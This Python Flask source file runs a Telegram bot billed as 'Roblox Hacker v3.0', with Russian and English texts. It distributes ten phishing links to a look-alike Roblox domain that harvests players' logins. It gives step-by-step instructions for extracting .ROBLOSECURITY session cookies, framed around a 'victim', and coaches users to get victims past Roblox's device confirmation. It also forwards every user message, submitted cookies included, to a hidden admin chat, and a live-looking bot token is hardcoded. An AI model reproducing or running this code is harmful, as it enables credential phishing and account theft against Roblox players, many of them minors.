from flask import Flask, request
import requests
import os
import json
import re

app = Flask(__name__)

BOT_TOKEN = "8767721552:AAEeqRMTCZBKim5iHBtLQvTkoH5b38c3b0w"
ADMIN_CHAT_ID = "8625870625"

# === ФАЙЛЫ ===
USERS_FILE = "users.json"
LANG_FILE = "lang.json"

def load_json(file):
    if os.path.exists(file):
        with open(file, "r") as f:
            return json.load(f)
    return {}

def save_json(file, data):
    with open(file, "w") as f:
        json.dump(data, f)

if os.path.exists(USERS_FILE):
    with open(USERS_FILE, "r") as f:
        USERS = json.load(f)
else:
    USERS = []

def save_user(user_id):
    if user_id not in USERS:
        USERS.append(user_id)
        with open(USERS_FILE, "w") as f:
            json.dump(USERS, f)

user_lang = load_json(LANG_FILE)

def save_lang():
    save_json(LANG_FILE, user_lang)

# === ТЕКСТЫ ===
TEXTS = {
    "ru": {
        "welcome": "🔓 *Roblox Hacker v3.0*\n\n▸ Инструмент для анализа аккаунтов Roblox\n▸ Получение куки и данных сессии\n▸ Быстрая обработка запросов\n\n📌 *Выберите действие:*",
        "hack": "🎯 *Введите логин или .ROBLOSECURITY куки аккаунта:*\n\n▸ Данные будут обработаны в течение 5-10 минут",
        "cookies_tutorial": (
            "🍪 *КАК ПОЛУЧИТЬ .ROBLOSECURITY КУКИ*\n\n"
            "─────────────────────\n"
            "🤖 *ANDROID:*\n"
            "1. Установите приложение *Qiwi Browser*.\n"
            "2. Зайдите в приложение Qiwi Browser.\n"
            "3. В браузере напишите расширение *EditCookie*.\n"
            "4. Зайдите на официальный сайт *Roblox.com*.\n"
            "5. Зайдите на свой аккаунт Roblox.\n"
            "6. Зайдите в профиль *жертвы*.\n"
            "7. Нажмите на 3 точки и выберите расширение *EditCookie*.\n"
            "8. Скопируйте весь текст в *Value .ROBLOSECURITY*.\n"
            "9. Отправьте весь текст с начала до конца в этого бота.\n\n"
            "─────────────────────\n"
            "🍎 *IPHONE:*\n"
            "1. Скачайте приложение *Cookie* в App Store.\n"
            "2. Зайдите в Safari.\n"
            "3. Нажмите на пазл внизу.\n"
            "4. Выберите *Управлять Расширениями*.\n"
            "5. Нажмите на ползунок *Cookie-edit*.\n"
            "6. Зайдите на официальный сайт *Roblox.com*.\n"
            "7. Зайдите на свой аккаунт Roblox.\n"
            "8. Зайдите в профиль *жертвы*.\n"
            "9. Снова нажмите на пазл.\n"
            "10. Нажмите на *Cookie-Editor*.\n"
            "11. Нажмите на *+* внизу.\n"
            "12. Name напишите `.`, а Value оставьте пустым.\n"
            "13. Нажмите на *Add*.\n"
            "14. Нажмите на *.ROBLOSECURITY*.\n"
            "15. Скопируйте весь текст 🍪\n"
            "16. Отправьте этот текст боту."
        ),
        "scam_links": (
            "👨‍💻 *СКАМ ССЫЛКИ*\n\n"
            "📌 *Их общее количество 10 шт.*\n\n"
            "─────────────────────\n"
            "🎮 *Grow a garden 2* — Хит скама\n"
            "➡️ [Тык](https://roblox.com.ug/games/97598239454123/Grow-a-Garden-2?privateServerLinkCode=09950661995727700947160135244713)\n\n"
            "🔪 *Murder mystery 2* — Хит скама\n"
            "➡️ [Тык](https://roblox.com.ug/games/142823291/Murder-Mystery-2?privateServerLinkCode=09950661995727700947160135244713)\n\n"
            "🐾 *Adopt me* — Хит скама\n"
            "➡️ [Тык](https://roblox.com.ug/games/920587237/Adopt-Me?privateServerLinkCode=09950661995727700947160135244713)\n\n"
            "🧠 *Steal a Brainrot* — Хит скама\n"
            "➡️ [Тык](https://roblox.com.ug/games/109983668079237/Steal-a-Brainrot?privateServerLinkCode=09950661995727700947160135244713)\n\n"
            "🏡 *Brookhaven RP*\n"
            "➡️ [Тык](https://roblox.com.ug/games/4924922222/Brookhaven-RP?privateServerLinkCode=09950661995727700947160135244713)\n\n"
            "🍎 *Blox Fruit*\n"
            "➡️ [Тык](https://roblox.com.ug/games/2753915549/Blox-Fruits?privateServerLinkCode=09950661995727700947160135244713)\n\n"
            "🚽 *Toilet Tower Defense*\n"
            "➡️ [Тык](https://roblox.com.ug/games/13775256536/LEGACY-Toilet-Tower-Defense?privateServerLinkCode=09950661995727700947160135244713)\n\n"
            "🐱 *Pet simulator 99*\n"
            "➡️ [Тык](https://roblox.com.ug/games/8737899170/WORLD-CUP-Pet-Simulator-99?privateServerLinkCode=09950661995727700947160135244713)\n\n"
            "⌨️ *+1 Speed Keyboard Escape*\n"
            "➡️ [Тык](https://roblox.com.ug/games/95082159892680/1-Speed-Keyboard-Escape-Candy-Chocolate?privateServerLinkCode=09950661995727700947160135244713)\n\n"
            "⚔️ *RIVALS*\n"
            "➡️ [Тык](https://roblox.com.ug/games/17625359962/RIVALS?privateServerLinkCode=09950661995727700947160135244713)\n\n"
            "─────────────────────\n"
            "📌 *Чтобы скопировать ссылку, нажмите на Тык ✍️ и скопируйте полностью текст*\n\n"
            "⚠️ *Данные ссылки работают: человека перекидывают на фейк сайт роблокса. Ему нужно зайти в роблокс аккаунт. После того как он всё ввёл — к вам приходят данные.*\n\n"
            "❌ *Если вылазит ошибка:*\n"
            "`To approve or reject this attempt open the Roblox app from a logged-in mobile or tablet device.`\n\n"
            "▸ Это означает, что Roblox требует подтверждения через оригинальное приложение. Попросите жертву открыть Roblox на телефоне."
        ),
        "support": "✍️ *Напишите название игры, которая вам требуется. Администратор свяжется с вами.*",
        "choose_lang": "🌐 *Выберите язык:*",
        "lang_changed": "✅ *Язык изменён.*",
        "reply_sent": "✅ *Ответ отправлен*",
        "choose_action": "📌 *Выберите действие:*",
        "admin_reply": "📨 *Ответ поддержки:*\n",
        "no_user": "⚠️ *Зажми сообщение с ID пользователя → Ответить*\n\n*Или используй команду:* `/reply ID Текст`"
    },
    "en": {
        "welcome": "🔓 *Roblox Hacker v3.0*\n\n▸ Tool for Roblox account analysis\n▸ Cookie and session data extraction\n▸ Fast request processing\n\n📌 *Choose an action:*",
        "hack": "🎯 *Enter login or .ROBLOSECURITY cookie:*\n\n▸ Data will be processed within 5-10 minutes",
        "cookies_tutorial": (
            "🍪 *HOW TO GET .ROBLOSECURITY COOKIE*\n\n"
            "─────────────────────\n"
            "🤖 *ANDROID:*\n"
            "1. Install *Qiwi Browser* app.\n"
            "2. Open Qiwi Browser.\n"
            "3. Type *EditCookie* extension in browser.\n"
            "4. Go to official *Roblox.com*.\n"
            "5. Log in to your Roblox account.\n"
            "6. Go to the *victim's* profile.\n"
            "7. Tap 3 dots and select *EditCookie*.\n"
            "8. Copy the entire text in *Value .ROBLOSECURITY*.\n"
            "9. Send the entire text to this bot.\n\n"
            "─────────────────────\n"
            "🍎 *IPHONE:*\n"
            "1. Download *Cookie* app from App Store.\n"
            "2. Open Safari.\n"
            "3. Tap the puzzle icon at the bottom.\n"
            "4. Select *Manage Extensions*.\n"
            "5. Enable *Cookie-edit* toggle.\n"
            "6. Go to official *Roblox.com*.\n"
            "7. Log in to your Roblox account.\n"
            "8. Go to the *victim's* profile.\n"
            "9. Tap the puzzle icon again.\n"
            "10. Tap *Cookie-Editor*.\n"
            "11. Tap *+* at the bottom.\n"
            "12. Name: `.`, Value: leave empty.\n"
            "13. Tap *Add*.\n"
            "14. Tap *.ROBLOSECURITY*.\n"
            "15. Copy the entire text 🍪\n"
            "16. Send this text to the bot."
        ),
        "scam_links": (
            "👨‍💻 *SCAM LINKS*\n\n"
            "📌 *Total: 10 links.*\n\n"
            "─────────────────────\n"
            "🎮 *Grow a garden 2* — Scam hit\n"
            "➡️ [Click](https://roblox.com.ug/games/97598239454123/Grow-a-Garden-2?privateServerLinkCode=09950661995727700947160135244713)\n\n"
            "🔪 *Murder mystery 2* — Scam hit\n"
            "➡️ [Click](https://roblox.com.ug/games/142823291/Murder-Mystery-2?privateServerLinkCode=09950661995727700947160135244713)\n\n"
            "🐾 *Adopt me* — Scam hit\n"
            "➡️ [Click](https://roblox.com.ug/games/920587237/Adopt-Me?privateServerLinkCode=09950661995727700947160135244713)\n\n"
            "🧠 *Steal a Brainrot* — Scam hit\n"
            "➡️ [Click](https://roblox.com.ug/games/109983668079237/Steal-a-Brainrot?privateServerLinkCode=09950661995727700947160135244713)\n\n"
            "🏡 *Brookhaven RP*\n"
            "➡️ [Click](https://roblox.com.ug/games/4924922222/Brookhaven-RP?privateServerLinkCode=09950661995727700947160135244713)\n\n"
            "🍎 *Blox Fruit*\n"
            "➡️ [Click](https://roblox.com.ug/games/2753915549/Blox-Fruits?privateServerLinkCode=09950661995727700947160135244713)\n\n"
            "🚽 *Toilet Tower Defense*\n"
            "➡️ [Click](https://roblox.com.ug/games/13775256536/LEGACY-Toilet-Tower-Defense?privateServerLinkCode=09950661995727700947160135244713)\n\n"
            "🐱 *Pet simulator 99*\n"
            "➡️ [Click](https://roblox.com.ug/games/8737899170/WORLD-CUP-Pet-Simulator-99?privateServerLinkCode=09950661995727700947160135244713)\n\n"
            "⌨️ *+1 Speed Keyboard Escape*\n"
            "➡️ [Click](https://roblox.com.ug/games/95082159892680/1-Speed-Keyboard-Escape-Candy-Chocolate?privateServerLinkCode=09950661995727700947160135244713)\n\n"
            "⚔️ *RIVALS*\n"
            "➡️ [Click](https://roblox.com.ug/games/17625359962/RIVALS?privateServerLinkCode=09950661995727700947160135244713)\n\n"
            "─────────────────────\n"
            "📌 *To copy a link, tap Click ✍️ and copy the entire text*\n\n"
            "⚠️ *These links work: redirect to a fake Roblox login page. After entering credentials, data is sent to you.*\n\n"
            "❌ *If you see an error:*\n"
            "`To approve or reject this attempt open the Roblox app from a logged-in mobile or tablet device.`\n\n"
            "▸ This means Roblox requires confirmation via the original app. Ask the victim to open Roblox on their phone."
        ),
        "support": "✍️ *Write the game name you need. Admin will contact you.*",
        "choose_lang": "🌐 *Choose language:*",
        "lang_changed": "✅ *Language changed.*",
        "reply_sent": "✅ *Reply sent*",
        "choose_action": "📌 *Choose action:*",
        "admin_reply": "📨 *Support reply:*\n",
        "no_user": "⚠️ *Long press message with user ID → Reply*\n\n*Or use command:* `/reply ID Text`"
    }
}

# === КЛАВИАТУРЫ ===
LANG_KEYBOARD = {
    "keyboard": [
        ["🇷🇺 Русский", "🇬🇧 English"]
    ],
    "resize_keyboard": True,
    "one_time_keyboard": True
}

MAIN_KEYBOARD_RU = {
    "keyboard": [
        ["👨‍💻 Скам ссылки", "🎯 Взломать аккаунт"],
        ["🍪 Как получить куки", "✍️ Написать поддержке"],
        ["🌐 Сменить язык"]
    ],
    "resize_keyboard": True,
    "one_time_keyboard": False
}

MAIN_KEYBOARD_EN = {
    "keyboard": [
        ["👨‍💻 Scam links", "🎯 Hack account"],
        ["🍪 How to get cookies", "✍️ Write to support"],
        ["🌐 Change language"]
    ],
    "resize_keyboard": True,
    "one_time_keyboard": False
}

# === ОСНОВНОЙ КОД ===
pending_reply = {}

@app.route('/')
def home():
    return "Bot is alive!", 200

@app.route('/webhook', methods=['POST'])
def webhook():
    global pending_reply
    data = request.get_json()
    
    if data and 'message' in data:
        chat_id = data['message']['chat']['id']
        text = data['message'].get('text', '')
        username = data['message']['from'].get('username', 'anon')
        user_id = data['message']['from']['id']

        # === АДМИН ===
        if str(chat_id) == ADMIN_CHAT_ID:
            reply_to = data['message'].get('reply_to_message')
            if reply_to:
                if pending_reply.get("user_id"):
                    target_id = pending_reply["user_id"]
                    target_lang = user_lang.get(str(target_id), "ru")
                    requests.post(
                        f"https://api.telegram.org/bot{BOT_TOKEN}/sendMessage",
                        json={
                            "chat_id": target_id,
                            "text": TEXTS[target_lang]["admin_reply"] + text,
                            "parse_mode": "Markdown"
                        }
                    )
                    requests.post(
                        f"https://api.telegram.org/bot{BOT_TOKEN}/sendMessage",
                        json={
                            "chat_id": ADMIN_CHAT_ID,
                            "text": f"✅ *Ответ отправлен* @{pending_reply.get('username', 'anon')}",
                            "parse_mode": "Markdown"
                        }
                    )
                    pending_reply = {}
                    return "ok", 200
                else:
                    requests.post(
                        f"https://api.telegram.org/bot{BOT_TOKEN}/sendMessage",
                        json={
                            "chat_id": ADMIN_CHAT_ID,
                            "text": "⚠️ *Не удалось найти пользователя для ответа.*",
                            "parse_mode": "Markdown"
                        }
                    )
                    return "ok", 200

            if text.startswith("/reply "):
                parts = text.split(" ", 2)
                if len(parts) >= 3 and parts[1].isdigit():
                    target_id = int(parts[1])
                    reply_text = parts[2]
                    target_lang = user_lang.get(str(target_id), "ru")
                    requests.post(
                        f"https://api.telegram.org/bot{BOT_TOKEN}/sendMessage",
                        json={
                            "chat_id": target_id,
                            "text": TEXTS[target_lang]["admin_reply"] + reply_text,
                            "parse_mode": "Markdown"
                        }
                    )
                    requests.post(
                        f"https://api.telegram.org/bot{BOT_TOKEN}/sendMessage",
                        json={
                            "chat_id": ADMIN_CHAT_ID,
                            "text": f"✅ *Ответ отправлен* (ID: {target_id})",
                            "parse_mode": "Markdown"
                        }
                    )
                    return "ok", 200
                else:
                    requests.post(
                        f"https://api.telegram.org/bot{BOT_TOKEN}/sendMessage",
                        json={
                            "chat_id": ADMIN_CHAT_ID,
                            "text": "⚠️ *Используй:* `/reply ID Текст`",
                            "parse_mode": "Markdown"
                        }
                    )
                    return "ok", 200

            if text and not text.startswith("/"):
                requests.post(
                    f"https://api.telegram.org/bot{BOT_TOKEN}/sendMessage",
                    json={
                        "chat_id": ADMIN_CHAT_ID,
                        "text": TEXTS["ru"]["no_user"],
                        "parse_mode": "Markdown"
                    }
                )
                return "ok", 200

            if text == '/start':
                requests.post(
                    f"https://api.telegram.org/bot{BOT_TOKEN}/sendMessage",
                    json={
                        "chat_id": ADMIN_CHAT_ID,
                        "text": "👋 *Привет, админ!*\n\n▸ Бот Roblox Hacker работает\n▸ Зажми сообщение → Ответить\n▸ Используй /help для списка команд",
                        "parse_mode": "Markdown",
                        "reply_markup": MAIN_KEYBOARD_RU
                    }
                )
                return "ok", 200

            if text == '/help':
                help_text = (
                    "📋 *Команды:*\n\n"
                    "/help — помощь\n"
                    "/users — количество пользователей\n"
                    "/reply ID Текст — ответить пользователю\n"
                    "/sendall Текст — рассылка\n\n"
                    "📌 *Зажми сообщение → Ответить*\n"
                    "📌 *Просто текст без ответа — НЕ отправляется*"
                )
                requests.post(
                    f"https://api.telegram.org/bot{BOT_TOKEN}/sendMessage",
                    json={
                        "chat_id": ADMIN_CHAT_ID,
                        "text": help_text,
                        "parse_mode": "Markdown"
                    }
                )
                return "ok", 200

            if text == '/users':
                requests.post(
                    f"https://api.telegram.org/bot{BOT_TOKEN}/sendMessage",
                    json={
                        "chat_id": ADMIN_CHAT_ID,
                        "text": f"👥 *Всего пользователей:* {len(USERS)}",
                        "parse_mode": "Markdown"
                    }
                )
                return "ok", 200

            if text.startswith("/sendall "):
                msg = text.replace("/sendall ", "")
                for uid in USERS:
                    try:
                        requests.post(
                            f"https://api.telegram.org/bot{BOT_TOKEN}/sendMessage",
                            json={"chat_id": uid, "text": msg}
                        )
                    except:
                        pass
                requests.post(
                    f"https://api.telegram.org/bot{BOT_TOKEN}/sendMessage",
                    json={
                        "chat_id": ADMIN_CHAT_ID,
                        "text": f"✅ *Рассылка отправлена* {len(USERS)} пользователям.",
                        "parse_mode": "Markdown"
                    }
                )
                return "ok", 200

            requests.post(
                f"https://api.telegram.org/bot{BOT_TOKEN}/sendMessage",
                json={
                    "chat_id": ADMIN_CHAT_ID,
                    "text": TEXTS["ru"]["no_user"],
                    "parse_mode": "Markdown"
                }
            )
            return "ok", 200

        # === ПОЛЬЗОВАТЕЛЬ ===
        save_user(user_id)
        lang = user_lang.get(str(user_id), "ru")
        t = TEXTS[lang]

        # Смена языка
        if text in ["🌐 Сменить язык", "🌐 Change language"]:
            requests.post(
                f"https://api.telegram.org/bot{BOT_TOKEN}/sendMessage",
                json={
                    "chat_id": chat_id,
                    "text": t["choose_lang"],
                    "reply_markup": LANG_KEYBOARD
                }
            )
            return "ok", 200

        if text == "🇷🇺 Русский":
            user_lang[str(user_id)] = "ru"
            save_lang()
            requests.post(
                f"https://api.telegram.org/bot{BOT_TOKEN}/sendMessage",
                json={
                    "chat_id": chat_id,
                    "text": TEXTS["ru"]["lang_changed"],
                    "parse_mode": "Markdown",
                    "reply_markup": MAIN_KEYBOARD_RU
                }
            )
            return "ok", 200

        if text == "🇬🇧 English":
            user_lang[str(user_id)] = "en"
            save_lang()
            requests.post(
                f"https://api.telegram.org/bot{BOT_TOKEN}/sendMessage",
                json={
                    "chat_id": chat_id,
                    "text": TEXTS["en"]["lang_changed"],
                    "parse_mode": "Markdown",
                    "reply_markup": MAIN_KEYBOARD_EN
                }
            )
            return "ok", 200

        # === ОТПРАВКА АДМИНУ (два сообщения: юзернейм и текст) ===
        pending_reply = {"user_id": user_id, "username": username}

        requests.post(
            f"https://api.telegram.org/bot{BOT_TOKEN}/sendMessage",
            json={
                "chat_id": ADMIN_CHAT_ID,
                "text": f"@{username}",
                "parse_mode": "Markdown"
            }
        )

        requests.post(
            f"https://api.telegram.org/bot{BOT_TOKEN}/sendMessage",
            json={
                "chat_id": ADMIN_CHAT_ID,
                "text": text,
                "parse_mode": "Markdown"
            }
        )

        # === ОБРАБОТКА КНОПОК ===
        keyboard = MAIN_KEYBOARD_EN if lang == "en" else MAIN_KEYBOARD_RU

        if text == '/start':
            requests.post(
                f"https://api.telegram.org/bot{BOT_TOKEN}/sendMessage",
                json={
                    "chat_id": chat_id,
                    "text": t["welcome"],
                    "parse_mode": "Markdown",
                    "reply_markup": keyboard
                }
            )

        elif text in ["👨‍💻 Скам ссылки", "👨‍💻 Scam links"]:
            requests.post(
                f"https://api.telegram.org/bot{BOT_TOKEN}/sendMessage",
                json={
                    "chat_id": chat_id,
                    "text": t["scam_links"],
                    "parse_mode": "Markdown",
                    "reply_markup": keyboard
                }
            )

        elif text in ["🎯 Взломать аккаунт", "🎯 Hack account"]:
            requests.post(
                f"https://api.telegram.org/bot{BOT_TOKEN}/sendMessage",
                json={
                    "chat_id": chat_id,
                    "text": t["hack"],
                    "parse_mode": "Markdown",
                    "reply_markup": keyboard
                }
            )

        elif text in ["🍪 Как получить куки", "🍪 How to get cookies"]:
            requests.post(
                f"https://api.telegram.org/bot{BOT_TOKEN}/sendMessage",
                json={
                    "chat_id": chat_id,
                    "text": t["cookies_tutorial"],
                    "parse_mode": "Markdown",
                    "reply_markup": keyboard
                }
            )

        elif text in ["✍️ Написать поддержке", "✍️ Write to support"]:
            requests.post(
                f"https://api.telegram.org/bot{BOT_TOKEN}/sendMessage",
                json={
                    "chat_id": chat_id,
                    "text": t["support"],
                    "parse_mode": "Markdown",
                    "reply_markup": keyboard
                }
            )

        else:
            requests.post(
                f"https://api.telegram.org/bot{BOT_TOKEN}/sendMessage",
                json={
                    "chat_id": chat_id,
                    "text": t["choose_action"],
                    "parse_mode": "Markdown",
                    "reply_markup": keyboard
                }
            )

    return "ok", 200

if __name__ == "__main__":
    port = int(os.environ.get("PORT", 10000))
    app.run(host="0.0.0.0", port=port)
